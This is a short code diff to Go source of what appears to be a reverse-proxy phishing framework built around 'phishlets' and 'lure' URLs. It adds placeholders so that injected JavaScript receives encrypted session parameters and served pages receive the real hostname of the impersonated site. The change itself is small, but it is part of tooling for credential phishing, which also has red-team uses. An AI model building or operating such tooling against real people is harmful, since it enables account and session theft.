@@ -245,6 +245,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								log.Warning("js_inject: script not found: '%s'", js_id)
 							}
 							d_body = strings.Replace(d_body, "{hostname}", p.cfg.PhishletConfig(pl.Name).Hostname, -1)
+							d_body = strings.Replace(d_body, "{enc_url}", s.EncryptParams(s.Params), -1)
 							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
 							return req, resp
 						} else {
@@ -1700,6 +1701,9 @@ func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, hostname str
 	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
 	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
 	body = strings.Replace(body, "{hostname}", hostname, -1)
+	u, _ := url.Parse(lure_url)
+	orig_hostname, _ := p.replaceHostWithOriginal(u.Host)
+	body = strings.Replace(body, "{orig_hostname}", orig_hostname, -1)
 
 	return body
 }
